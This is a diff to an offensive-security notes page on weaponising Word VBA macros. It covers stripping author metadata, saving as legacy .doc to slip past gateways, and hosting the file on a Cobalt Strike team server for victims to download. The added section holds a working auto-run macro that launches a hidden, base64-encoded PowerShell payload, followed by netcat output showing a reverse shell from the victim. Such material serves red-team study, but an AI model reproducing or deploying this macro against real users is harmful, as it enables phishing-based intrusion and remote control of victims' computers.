@@ -16,7 +16,7 @@ ___
 ## Description:
 VBA is an implementation of Visual Basic that is very widely used with Microsoft Office applications - often used to enhance or augment functionality in Word and Excel for data processing etc.
 
-## Installation
+## CobaltStrike
 You can create a macro in a Word document by going to **View > Macros > Create**.  Change the "Macros in" field from "All active templates and documents" to "Document 1". Give the macro a name and click **Create**.
 
 ``` 
@@ -38,20 +38,50 @@ In Cobalt Strike, go to **Attacks > Web Drive-by > Scripted Web Delivery (S)**�
 To prepare the document for delivery, go to **File > Info > Inspect Document > Inspect Document**, which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and Personal Information**. This is to prevent the username on your system being embedded in the document.
 
 
-Next, go to **File > Save As** and browse to **C:\Payloads**. Give it any filename, but in the **Save as type** dropdown, change the format from **_.docx_** to **Word 97-2003 (.doc)**. We do this because you can't save macro's inside a `.docx` and there's a stigma around the macro-enabled `.docm` extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway block them entirely). I find that this legacy `.doc` extension is the best compromise.
+Next, go to **File > Save As** and browse to `C:\Payloads`. Give it any filename, but in the **Save as type** dropdown, change the format from **_.docx_** to **Word 97-2003 (.doc)**. 
+
+host the file on the Team Server so we can simply send a link for them to download and execute. Go to **Attacks > Web drive-by > Host File**. Select **demo.doc** and provide a URI to access it on. 
+
+Run the macro on the victim's machine to get a beacon.
 
 
-When an Office document with an embedded macro is opened for the first time, the user is presented with a security warning (assuming the environment isn't locked down to block macro's entirely). For the macro to execute, the user _must_ click on **Enable Content**.
+## Powershell and NC
 
+```
+Sub AutoOpen()
+ MyMacro
+End Sub
+Sub Document_Open()
+ MyMacro
+End Sub
+Sub MyMacro()
+ Dim Str As String
+ 
+ Str = "powershell.exe -nop -w hidden -e JABzACAAPQAgAE4AZ"
+ Str = Str + "QB3AC0ATwBiAGoAZQBjAHQAIABJAE8ALgBNAGUAbQBvAHIAeQB"
+ Str = Str + "TAHQAcgBlAGEAbQAoACwAWwBDAG8AbgB2AGUAcgB0AF0AOgA6A"
+ Str = Str + "EYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAnAEg"
+ Str = Str + "ANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEATAAxAFgANgAyACsAY"
+ Str = Str + "gBTAEIARAAvAG4ARQBqADUASAAvAGgAZwBDAFoAQwBJAFoAUgB"
+ ...
+ Str = Str + "AZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0Ac"
+ Str = Str + "AByAGUAcwBzACkADQAKACQAcwB0AHIAZQBhAG0AIAA9ACAATgB"
+ Str = Str + "lAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAFMAdAByAGUAYQBtA"
+ Str = Str + "FIAZQBhAGQAZQByACgAJABnAHoAaQBwACkADQAKAGkAZQB4ACA"
+ Str = Str + "AJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAVABvAEUAbgBkACgAK"
+ Str = Str + "QA="
+ CreateObject("Wscript.Shell").Run Str
+End Sub
+```
 
-## Commands
-
-host the HTA on the Team Server so we can simply send a link for them to download and execute. Go to **Attacks > Web drive-by > Host File**. Select **demo.doc** and provide a URI to access it on. 
-
-
-
-Run the macro on the victum machine to get a beacon.
-
+```
+kali@kali:~$ nc -lnvp 4444
+listening on [any] 4444 ...
+connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 59111
+Microsoft Windows [Version 10.0.17134.590]
+(c) 2018 Microsoft Corporation. All rights reserved.
+C:\Users\Offsec>
+```
 ___
 
 ## Resources:
